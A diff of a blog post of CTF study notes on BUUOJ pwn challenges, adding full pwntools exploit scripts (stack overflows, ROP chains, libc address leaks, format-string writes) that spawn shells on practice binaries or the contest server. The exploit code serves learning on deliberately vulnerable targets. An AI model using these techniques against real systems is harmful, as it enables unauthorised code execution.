@@ -1,11 +1,13 @@
 ---
-layout: post
+toc: true
+toc_sticky: true
 title:  "信息安全学习笔记 - BUUOJ Pwn"
 date:   2020-08-26 22:15:38 +0800
+categories: 
+  - pwn
 ---
 
-
-# BUUOJ PWN
+# Buuoj PWN 题目冲分过程（指俯冲）
 
 ## Requirements
 1. python
@@ -31,60 +33,930 @@ date:   2020-08-26 22:15:38 +0800
 
 ## Problems
 
-1. test_your_nc 
-   1. ida system("/bin/sh");
-   2. `perl -e 'print "ls\ncat flag\n"' | test_your_nc`
-2. [**RA**] rip
-   1. `system("/bin/sh")` found
-   2. segfault??? _TODO_
-3. [**RA**] warmup_csaw_2016
-   1. `system("cat flag.txt")` found
-   2. `perl -e 'print "A"x72 . "\x0d\x06\x40\x00\x00\x00\x00\x00\n"' | ./warmup_csaw_2016`
-4. [**RA**] pwn1_sctf_2016
-   1. `'system("cat flag.txt")'` found
-   2. `perl -e 'print "I"x20 . "\xef\xbe\xad\xde\x0d\x8f\x04\x08\n"' | ./pwn1`
-5. [**RA**] ciscn_2019_n_1
-   1. `perl -e 'print "A"x(0x30-4) . "\x00\x80\x34\x41\n"' | ./ciscn_2019_n_1`
-6. [**ROP**]({{ site.url }}/2020/07/14/buuoj-pwn-ciscn_2019_c_1.html) ciscn_2019_c_1
-7. [**ROP**]({{ site.url }}/assets/OGeek2019_babyrop.py) [OGeek2019]babyrop
-   1. Flaw: `strncmp(a, b, 0)` always returns 0
-8. ciscn_2019_en_2: the same as [ciscn_2019_c_1]({{ site.url }}/2020/07/14/buuoj-pwn-ciscn_2019_c_1.html)
-9. [**ROP**]({{ site.url }}/assets/get_started_3dsctf_2016.py) get_started_3dsctf_2016:
-   1.  Peaceful exit ?
-10. [**ROP**]({{ site.url }}/assets/5space_pwn5.py) [第五空间2019 决赛]PWN5: [**Format string exploit**](https://wooyun.js.org/drops/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B.html)
-11. [**ROP**]({{ site.url }}/assets/jarvisoj_level0.py) jarvisoj_level0
-12. [**ROP**]({{ site.url }}/assets/r2t3.py) [BJDCTF 2nd]r2t3:
-    1. Flaw: truncated string length: `uint8_t length = (uint8_t) strlen(input)`
-13. [**ROP**]({{ site.url }}/assets/ciscn_2019_n_8.py) ciscn_2019_n_8
-14. [**ROP**]({{ site.url }}/assets/not_the_same_3dsctf_2016.py) not_the_same_3dsctf_2016
-    1. Or [mprotect(.bss)](https://zhuanlan.zhihu.com/p/141065867), read and shellcode _TODO_
-15. [**ROP**]({{ site.url }}/assets/HarekazeCTF2019_baby_rop.py) [HarekazeCTF2019]baby_rop
-16. [**ROP**]({{ site.url }}/assets/BJDCTF_2nd_one_gadget.py) [BJDCTF 2nd]one_gadget
-    1. The [one_gadget](https://github.com/david942j/one_gadget) tool
-17. [**ROP**]({{ site.url }}/assets/bjdctf_2020_babystack.py) bjdctf_2020_babystack
-18. [**ROP**]({{ site.url }}/assets/ciscn_2019_n_5.py) ciscn_2019_n_5
-    1.  libc: `http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb`
-19. [**ROP**]({{ site.url }}/assets/ciscn_2019_s_3.py) [ciscn_2019_s_3](http://liul14n.top/2020/03/07/Ciscn-2019-s-3/)
-    1.  Construct `"/bin/sh"` on stack
-    2.  ROP via `__libc_csu_init()`
-    3.  Or, [`sigreturn()`](http://liul14n.top/2020/03/07/Ciscn-2019-s-3/)
-20. [**ROP**]({{ site.url }}/assets/HarekazeCTF2019_baby_rop_2.py) [HarekazeCTF2019]babyrop2
-    1.  Leaked address of `printf()` ends with `"\x00"` and outputs nothing
-    2.  Construct `"/bin/sh"` and ROP chain in .bss segment
-21. [**ROP**]({{ site.url }}/assets/pwn2_sctf_2016.py) pwn2_sctf_2016
-    1.  Flaw: only check if length<=0x20
-22. [**ROP**]({{ site.url }}/assets/2018_rop.py) [铁人三项(第五赛区)] 2018_rop
-23. [**ROP**]({{ site.url }}/assets/bjdctf_2020_babyrop.py) [bjdctf_2020] bjdctf_2020_babyrop
-24. [**ROP**]({{ site.url }}/assets/ez_pz_hackover_2016.py) ez_pz_hackover_2016
-    1.  [Flaw](http://mrbelieve.tech/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/): `strcmp` terminates at `"\x00"`
-25. [**ROP**]({{ site.url }}/assets/jarvisoj_level2_x64.py) jarvisoj_level2_x64
-26. [**ROP**]({{ site.url }}/assets/ciscn_2019_ne_5.py) ciscn_2019_ne_5
-    1.  `system("sh")` works...
-    2.  `scanf()` ignores `'\x0b'`
-27. others_shellcode: `"/bin/////sh"` works fine
-28. [**ROP**]({{ site.url }}/assets/ciscn_2019_es_2.py) ciscn_2019_es_2
-    1.  [frame faking](https://g.yuque.com/goldrick/pl0aqm/ccd1iu)
-29. [BJDCTF 2nd]test: 
-    1.  Flaw: incomplete filters and privilege escalation using [shell(`x86_64`)](https://zhuanlan.zhihu.com/p/138482510)
-30. [**ROP**]({{ site.url }}/assets/spwn.py) spwn:
-    1.  frame faking
+### test_your_nc 
+
+- ida system("/bin/sh");
+```shell
+perl -e 'print "ls\ncat flag\n"' | test_your_nc
+```
+
+### rip
+1. `system("/bin/sh")` found 
+2. segfault??? _TODO_
+
+### warmup_csaw_2016
+1. `system("cat flag.txt")` found
+
+```shell
+perl -e 'print "A"x72 . "\x0d\x06\x40\x00\x00\x00\x00\x00\n"' | ./warmup_csaw_2016
+```
+
+### pwn1_sctf_2016
+1. `'system("cat flag.txt")'` found
+
+```shell
+perl -e 'print "I"x20 . "\xef\xbe\xad\xde\x0d\x8f\x04\x08\n"' | ./pwn1
+```
+
+### ciscn_2019_n_1
+```shell
+perl -e 'print "A"x(0x30-4) . "\x00\x80\x34\x41\n"' | ./ciscn_2019_n_1
+```
+
+### ciscn_2019_c_1
+
+传送门 -> [here]({{ site.url }}/2020-07-14-buuoj-pwn-rop-ciscn_2019_c_1.markdown)
+
+### [OGeek2019]babyrop
+1. Flaw: `strncmp(a, b, 0)` always returns 0
+
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+elf = ELF('./babyrop')
+
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+
+log.info(f'puts: got={hex(puts_got)}; plt={hex(puts_plt)}')
+
+proc = process('./babyrop')
+# proc = remote('node3.buuoj.cn', 26351)
+main = 0x08048825
+
+# strncmp(payload_length, a, strlen(payload_length)) always returns 0
+payload_length = [0] * 0x20
+# read() is misled to take an input of length 0xff
+payload_length[7] = 0xff
+payload_length = bytes(payload_length)
+
+proc.send(payload_length)
+log.info(proc.recvuntil('\n'))
+
+payload_leak = b'i' * (0xe7 + 4) + p32(puts_plt) + p32(main) + p32(puts_got)
+proc.send(payload_leak)
+
+puts_libc = u32(proc.recvuntil(b'\n', drop=True))
+log.info(f'libc: puts={hex(puts_libc)}')
+
+from LibcSearcher import LibcSearcher
+
+searcher = LibcSearcher('puts', puts_libc)
+
+base_libc = puts_libc - searcher.dump('puts')
+log.info(f"libc: base={hex(base_libc)}")
+
+system_libc = base_libc + searcher.dump('system')
+binsh_libc = base_libc + searcher.dump('str_bin_sh')
+log.info(f'libc: system={hex(system_libc)}; /bin/sh={hex(binsh_libc)}')
+
+proc.send(payload_length)
+log.info(proc.recvuntil('\n'))
+
+payload_shell = b'i' * (0xe7 + 4) + p32(system_libc) + p32(main) + p32(binsh_libc)
+proc.send(payload_shell)
+
+proc.interactive()
+```
+
+### ciscn_2019_en_2
+1. The same as [ciscn_2019_c_1]
+
+
+### get_started_3dsctf_2016:
+1.  Peaceful exit ?
+
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+elf = ELF("./get_started_3dsctf_2016")
+proc = process("./get_started_3dsctf_2016")
+# proc = remote("node3.buuoj.cn", 29563)
+
+# c gets
+log.info(f"get_flag={hex(elf.sym['get_flag'])}")
+# segfault
+# payload = b'i'*0x38 + p32(elf.sym['get_flag']) + p32(elf.sym['main']) +  p32(0x308CD64F) + p32(0x195719D1)
+
+# Peaceful exit
+payload = b'i'*0x38 + \
+  p32(elf.sym['get_flag']) + \
+  p32(0x0806fc09) + \
+  p32(0x308CD64F) + p32(0x195719D1) + \
+  p32(elf.sym['exit']) + p32(0xdeadbeef) + p32(0)
+
+# with open('input', 'wb') as f:
+#   f.write(payload + b'\n')
+
+proc.sendline(payload)
+
+log.info(proc.recvall())
+```
+### [第五空间2019 决赛]PWN5
+1. [**Format string exploit**](https://wooyun.js.org/drops/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B.html)
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+elf = ELF("./5space_pwn5")
+proc = process("./5space_pwn5")
+# proc = remote("node3.buuoj.cn", 25409)
+
+dest = 0x0804C044
+payload = b'%x' * 10 + b'%f%f%f%n' + p32(dest)
+
+log.info(proc.recvuntil("your name:"))
+
+proc.sendline(payload)
+output = proc.recvuntil(b'your passwd:', drop=True)
+
+output = output.replace(b'Hello,', b'')
+log.info(f'output={output};len={len(output)}')
+end = output.find(p32(dest))
+output = output[:end]
+log.success(f'len={len(output)}')
+
+proc.sendline(bytes(f'{len(output)}', encoding='ascii'))
+# log.success(proc.recvuntil())
+proc.interactive()
+```
+### jarvisoj_level0
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+elf = ELF("./jarvisoj_level0")
+# proc = process("./jarvisoj_level0")
+proc = remote("node3.buuoj.cn", 26872)
+
+# ROPgadget --binary jarvisoj_level0 --only 'pop|ret'
+pop_rdi = 0x0000000000400663
+# ROPgadget --binary jarvisoj_level0 --string '/bin/sh'
+str_bin_sh = 0x0000000000400684
+system_plt = elf.sym['system']
+
+payload = b'i' * 0x88 + p64(pop_rdi) + p64(str_bin_sh) + p64(system_plt)
+
+proc.sendline(payload)
+proc.interactive()
+```
+
+### [BJDCTF 2nd]r2t3:
+1. Flaw: truncated string length: `uint8_t length = (uint8_t) strlen(input)`
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+exec_path = './r2t3'
+elf = ELF(exec_path)
+# proc = process(exec_path)
+proc = remote("node3.buuoj.cn", 28147)
+
+system_plt = elf.sym['system']
+main_sym = elf.sym['main']
+exit_sym = elf.sym['exit']
+# ROPgadget --binary r2t3 --string '/bin/sh'
+binsh_addr = 0x08048760
+# ROPgadget --binary r2t3 --only 'pop|ret'
+pop_ret_addr = 0x080483d5
+
+log.info(f'system@plt={hex(system_plt)}; /bin/sh={hex(binsh_addr)}')
+log.info(f'main={hex(main_sym)}; exit={hex(exit_sym)}')
+
+payload = b'i' * (0x11+0x4) + p32(system_plt) + p32(main_sym) + p32(binsh_addr) # + p32(exit_sym) + p32(exit_sym) + p32()
+# uint8_t length = (uint8_t) strlen(input);
+trailing = b'kayoch1n'
+payload += b'i' * (0x105 - len(trailing) - len(payload)) + trailing + b'\x00'
+log.info(f'len of payload={hex(len(payload))}')
+
+proc.recvuntil(b'Please input your name:')
+proc.sendline(payload)
+proc.interactive()
+```
+
+### ciscn_2019_n_8
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+exec_path = './ciscn_2019_n_8'
+elf = ELF(exec_path)
+# proc = process(exec_path)
+proc = remote("node3.buuoj.cn", 27348)
+proc.recvuntil(b"What's your name?")
+payload = b'i' * 0x34 + b"\x11"
+proc.sendline(payload)
+proc.interactive()
+```
+
+### not_the_same_3dsctf_2016
+1. ROP, or [mprotect(.bss)](https://zhuanlan.zhihu.com/p/141065867), read and shellcode _TODO_
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+exec_path = './not_the_same_3dsctf_2016'
+elf = ELF(exec_path)
+# proc = process(exec_path)
+proc = remote("node3.buuoj.cn", 28179)
+
+
+get_secret = elf.sym['get_secret']
+log.info(f'get_secret={hex(get_secret)}')
+
+printf = elf.sym['printf']
+log.info(f'printf={hex(printf)}')
+
+exit_ = elf.sym['exit']
+log.info(f'exit={hex(exit_)}')
+
+array_addr = 0x080ECA2D
+pop_ret = 0x080481ad
+payload = b'i' * 0x2d + p32(get_secret) + p32(printf) + p32(pop_ret) + p32(array_addr) + p32(exit_) + p32(0)
+
+proc.sendline(payload)
+log.info(f'output={proc.recv(numb=128)}')
+```
+
+### [HarekazeCTF2019]baby_rop
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+filename = './baby_rop'
+
+elf = ELF(filename)
+proc = process(filename)
+# proc = remote('node3.buuoj.cn', 25573)
+
+main_addr = elf.sym['main']
+log.info(f'main={hex(main_addr)}')
+
+system_plt = elf.plt['system']
+log.info(f'system={hex(system_plt)}')
+
+
+# ROPgadget --binary baby_rop --string '/bin/sh'
+str_bin_sh = 0x0000000000601048
+
+# ROPgadget --binary baby_rop --only 'pop|ret'
+pop_rdi = 0x0000000000400683
+ret = 0x0000000000400479
+# Ubuntu 18
+payload = b'i' * (0x10 + 8) + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_plt) + p64(main_addr)
+
+# with open(f'{filename}_input', 'wb') as f:
+#   f.write(payload)
+
+proc.recvuntil(b"What's your name?")
+proc.sendline(payload)
+# proc.recvuntil(b'\n')
+proc.interactive()
+```
+
+### [BJDCTF 2nd]one_gadget
+1. Utility [one_gadget](https://github.com/david942j/one_gadget)
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+filename = './one_gadget'
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+proc = process(filename)
+one_gadget -f /lib/x86_64-linux-gnu/libc.so.6
+one_gadget_off = 0x45216
+
+# libc = ELF('/home/ubuntu/project/libc/buuoj-ubuntu1904-x86_64-libc-2.29.so')
+# proc = remote('node3.buuoj.cn', 29405)
+# # one_gadget -f /home/ubuntu/project/libc/libc-2.29.so
+# one_gadget_off = 0x106ef8
+
+proc.recvuntil(b'here is the gift for u:')
+printf_addr = int(proc.recvuntil(b'\n'), 16)
+log.info(f'printf libc={hex(printf_addr)}')
+
+libc_base = printf_addr - libc.sym['printf']
+log.info(f'libc base={hex(libc_base)}')
+log.info(f'execve("/bin/sh")={hex(one_gadget_off + libc_base)}')
+
+proc.recvuntil(b'Give me your one gadget:')
+proc.sendline(str(one_gadget_off + libc_base).encode())
+
+proc.interactive()
+```
+
+### bjdctf_2020_babystack
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+filename = './bjdctf_2020_babystack'
+elf = ELF(filename)
+# p = process(filename)
+p = remote("node3.buuoj.cn", 27571)
+
+log.info(f'backdoor={hex(elf.sym["backdoor"])}')
+
+payload = b'a' * (0x10+8) + p64(elf.sym["backdoor"])
+
+p.recvuntil(b'Please input the length of your name:')
+p.sendline(str(len(payload)))
+
+p.recvuntil(b"What's u name?")
+p.sendline(payload)
+
+p.interactive()
+```
+
+### ciscn_2019_n_5
+1.  libc: `http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb`
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+filename = './ciscn_2019_n_5'
+elf = ELF(filename)
+# p = process(filename)
+p = remote("node3.buuoj.cn", 27624)
+
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main = elf.sym['main']
+
+# ROPgadget --binary ciscn_2019_n_5 --only 'pop|ret'
+pop_rdi = 0x0000000000400713
+ret = 0x00000000004004c9
+
+def do_main(payload):
+    p.sendline('kke')
+    p.recvuntil(b'What do you want to say to me?\n')
+    p.sendline(payload)
+
+# Leak puts()
+do_main(b'a' * (0x20+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main))
+
+puts_addr = u64(p.recv().ljust(8, b'\x00'))
+log.info(f'puts={hex(puts_addr)}')
+
+searcher = LibcSearcher(func='puts', address=puts_addr)
+libc_base = puts_addr - searcher.dump('puts')
+libc_system = libc_base + searcher.dump('system')
+bin_sh = libc_base + searcher.dump('str_bin_sh')
+
+log.info(f'base={hex(libc_base)}; system={hex(libc_system)}; /bin/sh={hex(bin_sh)}')
+
+do_main(b'a' * (0x20+8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(libc_system) + p64(main))
+
+p.interactive()
+```
+
+### ciscn_2019_s_3
+1.  Construct `"/bin/sh"` on stack
+2.  ROP via `__libc_csu_init()`
+3.  Or, [`sigreturn()`](http://liul14n.top/2020/03/07/Ciscn-2019-s-3/)
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+
+filename = './ciscn_2019_s_3'
+elf = ELF(filename)
+p = process(filename)
+# p = remote("node3.buuoj.cn", 26355)
+
+main = elf.sym["main"]
+log.warn(f'main={hex(main)}')
+
+payload = b'/bin/sh\x00' + b'b'*8 + p64(elf.sym['vuln'])
+
+p.send(payload)
+offset = 0x118
+binsh = u64(p.recv()[32:40]) - 0x118
+log.success('binsh = ' + hex(binsh))
+
+# Pop to rbx, rbp, r12, r13, r14, r15
+p6r = 0x000000000040059A
+mov_r12_call = 0x0000000000400580
+
+mov_exec_ret = 0x00000000004004e2 
+sys_call = 0x0000000000400517
+pop_rdi_ret = 0x00000000004005a3
+
+# 1
+# 直接传递字符串是不 ok 的，因为 rdi 的高32位被强制截断为 0；
+# 0x0000000000400586 <+70>:    mov    %r15d,%edi
+# (gdb) i r rdi
+# rdi            0x7ffebe3175b0   140732089333168
+# (gdb) ni
+# 0x0000000000400589 in __libc_csu_init ()
+# (gdb) i r rdi
+# rdi            0xbe3175b0       3190912432
+
+# 2
+# 在 call r12 之后想要通过gadget去补救也是不 OK 的，因为call 指令 push 了一个地址，程序无法执行后面的 gadget
+# 
+
+payload = b'/bin/sh\x00' + p64(mov_exec_ret)\
+    + p64(p6r)\
+    + p64(0) + p64(1)\
+    + p64(binsh + 8)\
+    + p64(0) * 2\
+    + p64(binsh)\
+    + p64(mov_r12_call)\
+    + p64(0) * 7\
+    + p64(pop_rdi_ret)\
+    + p64(binsh)\
+    + p64(sys_call)
+
+# input()
+
+p.send(payload)
+p.interactive()
+```
+
+### [HarekazeCTF2019]babyrop2
+1.  Leaked address of `printf()` ends with `"\x00"` and outputs nothing
+2.  Construct `"/bin/sh"` and ROP chain in .bss segment
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+
+filename = './HarekazeCTF2019_baby_rop2'
+e = ELF(filename)
+# p = process(filename)
+p = remote("node3.buuoj.cn", 29984)
+
+#    0x0000000000400689 <+83>:    lea    -0x20(%rbp),%rax
+#    0x000000000040068d <+87>:    mov    $0x100,%edx
+#    0x0000000000400692 <+92>:    mov    %rax,%rsi
+#    0x0000000000400695 <+95>:    mov    $0x0,%edi
+#    0x000000000040069a <+100>:   callq  0x400500 <read@plt>
+# buffer size=0x20, max length of input=0x100
+ra_offset = 0x20 + 0x8
+
+# ROPgadget --binary HarekazeCTF2019_baby_rop2 --only 'pop|ret'
+pop_rdi_ret = 0x0000000000400733
+main = e.sym['main']
+# TODO HINT 1:
+# https://h-noson.hatenablog.jp/entry/2019/05/19/232401#Baby-ROP-2-200-pts-81-solves
+# Leaked address of "printf" ends with '\x00' and process outputs NOTHING
+printf_plt, read_got = e.plt['printf'], e.got['read']
+# log.level = 'DEBUG'
+log.debug(f'read:got={hex(read_got)}, printf:plt={hex(printf_plt)}; main={hex(main)}')
+p.recvuntil(b'What')
+payload_leak = b'1' * ra_offset + p64(pop_rdi_ret) + p64(read_got) + p64(printf_plt) + p64(main)
+
+p.sendline(payload_leak)
+log.level = 'DEBUG'
+misc = p.recvuntil(b'\n')
+log.debug(f'misc={misc}, len={len(misc)}')
+
+# Outputs contain the string from next run
+read_addr = u64(p.recvuntil(b'What')[:-len(b'What')].ljust(8, b'\x00'))
+assert read_addr
+log.success(f'address of "read()": {hex(read_addr)}')
+
+searcher = LibcSearcher()
+searcher.add_condition('read', read_addr)
+base_addr = read_addr - searcher.dump('read')
+system_addr = searcher.dump('system') + base_addr
+bin_sh_addr = searcher.dump('str_bin_sh') + base_addr
+log.success(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')
+
+payload = b'2' * ra_offset + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
+
+p.sendline(payload)
+p.interactive()
+
+# find . -name '*flag*'
+# cat ./home/babyrop2/flag
+```
+
+### pwn2_sctf_2016
+1.  Flaw: only check if length<=0x20
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+
+filename = './pwn2_sctf_2016'
+e = ELF(filename)
+# p = process(filename)
+p = remote("node3.buuoj.cn", 28911)
+
+vuln = e.sym['vuln']
+printf_plt, printf_got = e.plt['printf'], e.got['printf']
+log.info(f'printf:plt={hex(printf_plt)}, got={hex(printf_got)}, vuln={hex(vuln)}')
+
+# TODO HINT: Only NUM <= 0x20 is allowed; use a negative integer instead
+#   0x0804855a <+43>:    call   0x80483c0 <atoi@plt>
+#   0x0804855f <+48>:    mov    %eax,-0xc(%ebp)
+#   0x08048562 <+51>:    cmpl   $0x20,-0xc(%ebp)
+#   0x08048566 <+55>:    jle    0x804857d <vuln+78>
+p.sendline(b'-1')
+
+ra_offset = 0x2c + 4
+payload_leak = b'0' * ra_offset + p32(printf_plt) + p32(vuln) + p32(printf_got)
+p.sendline(payload_leak)
+
+
+p.recvuntil(b'You said: ')
+content = p.recvline()
+log.debug(f'content={content}')
+
+print_addr = u32(p.recv(4).ljust(4, b'\x00'))
+log.success(f'print addr={hex(print_addr)}')
+
+searcher = LibcSearcher()
+searcher.add_condition('printf', print_addr)
+base_addr = print_addr - searcher.dump('printf')
+system_addr = base_addr + searcher.dump('system')
+bin_sh_addr = base_addr + searcher.dump('str_bin_sh')
+log.success(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={bin_sh_addr}')
+
+p.sendline(b'-1')
+payload = b'1' * ra_offset + p32(system_addr) + p32(vuln) + p32(bin_sh_addr)
+p.sendline(payload)
+p.interactive()
+```
+
+### [铁人三项(第五赛区)] 2018_rop
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+
+filename = './2018_rop'
+e = ELF(filename)
+# p = process(filename)
+p = remote("node3.buuoj.cn", 27189)
+
+vuln = e.sym['vulnerable_function']
+write_plt, start_got = e.plt['write'], e.got['__libc_start_main']
+log.info(f'write:plt={hex(write_plt)}, __libc_start_main:got={hex(start_got)}')
+
+ra_offset = 0x88 + 4 
+payload_leak = b'1' * ra_offset + p32(write_plt) + p32(vuln) + p32(1) + p32(start_got) + p32(4)
+
+p.sendline(payload_leak)
+
+start_addr = u32(p.recv(numb=4).ljust(4, b'\x00'))
+log.success(f'start:{hex(start_addr)}')
+
+searcher = LibcSearcher()
+searcher.add_condition('__libc_start_main', start_addr)
+base_addr = start_addr - searcher.dump('__libc_start_main')
+system_addr = base_addr + searcher.dump('system')
+bin_sh_addr = base_addr + searcher.dump('str_bin_sh')
+
+log.info(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')
+payload = b'2' * ra_offset + p32(system_addr) + p32(vuln) + p32(bin_sh_addr)
+p.sendline(payload)
+p.interactive()
+```
+### bjdctf_2020_babyrop
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+
+filename = './bjdctf_2020_babyrop'
+e = ELF(filename)
+# p = process(filename)
+p = remote("node3.buuoj.cn", 28912)
+
+log.level = 'DEBUG'
+for k, v in e.got.items():
+    log.debug(f'got:{k}={hex(v)}')
+
+vuln = e.sym['vuln']
+puts_plt, c_func_got = e.plt['puts'], e.got['__libc_start_main']
+log.info(f'put:plt={hex(puts_plt)}, __libc_start_main:got={hex(c_func_got)}')
+
+ra_offset = 0x20 + 8
+# ROPgadget --binary bjdctf_2020_babyrop --only 'pop|ret'
+pop_rdi_ret = 0x0000000000400733 
+payload_leak = b'1' * ra_offset + p64(pop_rdi_ret) + p64(c_func_got) + p64(puts_plt) + p64(vuln)
+
+p.recvuntil(b'story!\n')
+p.sendline(payload_leak)
+
+start_addr = u64(p.recv(6).ljust(8, b'\x00'))
+log.success(f'put:{hex(start_addr)}')
+
+searcher = LibcSearcher()
+searcher.add_condition('__libc_start_main', start_addr)
+base_addr = start_addr - searcher.dump('__libc_start_main')
+system_addr = base_addr + searcher.dump('system')
+bin_sh_addr = base_addr + searcher.dump('str_bin_sh')
+
+log.info(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')
+payload = b'2' * ra_offset + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
+p.sendline(payload)
+p.interactive()
+```
+### ez_pz_hackover_2016
+1.  [Flaw](http://mrbelieve.tech/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/): `strcmp` terminates at `"\x00"`
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+
+filename = './ez_pz_hackover_2016'
+e = ELF(filename)
+p = process(filename)
+# p = remote("node3.buuoj.cn", 26524)
+
+log.level = 'DEBUG'
+for k, v in e.got.items():
+    log.debug(f'got:{k}={hex(v)}')
+
+chall = e.sym['chall']
+printf_plt, c_func_got = e.plt['printf'], e.got['__libc_start_main']
+log.info(f'put:plt={hex(printf_plt)}, __libc_start_main:got={hex(c_func_got)}')
+
+# TODO HINT: -0x32(%ebp) => 0x32+4 is a false offset
+# breakpoint at *vuln(buffer, 0x400)+0:
+#   memory starting from the address of the first argument is copied to destination
+#   offset of ra = 0x32+4 = buffer - (ebp+8) + 8 + x
+ra_offset = 0x12
+pivot = b'crashme\x00'
+payload_leak = pivot + b'a'*ra_offset + p32(printf_plt) + p32(chall) + p32(c_func_got)
+
+content = p.recvuntil(b'>')
+log.debug(content)
+
+p.sendline(payload_leak)
+p.recvuntil(b'crashme!\n')
+c_func_addr = u32(p.recv(4))
+log.success(f'__libc_start_main={hex(c_func_addr)}')
+
+searcher = LibcSearcher()
+searcher.add_condition('__libc_start_main', c_func_addr)
+base_addr = c_func_addr - searcher.dump('__libc_start_main')
+system_addr = base_addr + searcher.dump('system')
+bin_sh_addr = base_addr + searcher.dump('str_bin_sh')
+
+log.info(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')
+payload = pivot + b'a'*ra_offset + p32(system_addr) + p32(chall) + p32(bin_sh_addr)
+p.sendline(payload)
+p.interactive()
+```
+
+### jarvisoj_level2_x64
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+
+filename = './jarvisoj_level2_x64'
+e = ELF(filename)
+# p = process(filename)
+p = remote("node3.buuoj.cn", 27641)
+
+log.level = 'DEBUG'
+for k, v in e.got.items():
+    log.debug(f'got:{k}={hex(v)}')
+
+# ROPgadget --binary jarvisoj_level2_x64 --string '/bin/sh'
+bin_sh_addr = 0x0000000000600a90
+# ROPgadget --binary jarvisoj_level2_x64 --only 'pop|ret'
+pop_rdi_ret = 0x00000000004006b3
+call_system = 0x000000000040063e
+
+ra_offset = 0x80+8
+payload = b'0'*ra_offset + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(call_system)
+p.sendline(payload)
+p.interactive()
+```
+### ciscn_2019_ne_5
+1.  `system("sh")` works...
+2.  `scanf()` ignores `'\x0b'`
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+filename = './ciscn_2019_ne_5'
+e = ELF(filename)
+# p = process(filename)
+p = remote("node3.buuoj.cn", 26125)
+
+log.level = 'DEBUG'
+for k, v in e.got.items():
+    log.debug(f'got:{k}={hex(v)}')
+
+# TODO HINT
+# GetFlag: strcpy
+# AddLog: scanf truncate "\x0b"
+# Print: system("echo Printing")
+
+ret_main = e.sym['main']
+output_plt, c_func_got = e.plt['printf'], e.got['__libc_start_main']
+log.info(f'printf:plt={hex(output_plt)}, __libc_start_main:got={hex(c_func_got)}')
+
+def Auth():
+    p.recvuntil(b'password:')
+    p.sendline(b'administrator')
+
+def AddLog(content):
+    p.recvuntil(b'Input your operation:')
+    p.recvuntil(':')
+    p.sendline(b'1')
+    p.recvuntil(b'Please input new log info:')
+    p.sendline(content)
+
+def GetFlag():
+    p.recvuntil(b'Input your operation:')
+    p.recvuntil(b':')
+    p.sendline(b'4')
+    p.recvuntil(b'The flag is your log:')
+
+def Display():
+    p.recvuntil(b'Input your operation:')
+    p.recvuntil(b':')
+    p.sendline(b'2')
+
+ra_offset = 0x48+4
+
+Auth()
+AddLog(b'0' * ra_offset + p32(output_plt) + p32(ret_main) + p32(c_func_got))
+Display()
+GetFlag()
+
+p.recvuntil(b'\n')
+
+c_func_addr = u32(p.recv(4))
+log.success(f'__libc_start_main:{hex(c_func_addr)}')
+
+searcher = LibcSearcher()
+searcher.add_condition('__libc_start_main', c_func_addr)
+base_addr = c_func_addr - searcher.dump('__libc_start_main')
+system_addr = base_addr + searcher.dump('system')
+bin_sh_addr = base_addr + searcher.dump('str_bin_sh')
+log.info(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')
+
+Auth()
+
+AddLog(b'1' * ra_offset + p32(system_addr) + p32(ret_main) + p32(bin_sh_addr + len('/bin/')))
+GetFlag()
+
+p.interactive()
+```
+### others_shellcode
+`"/bin/////sh"` works fine
+
+### ciscn_2019_es_2
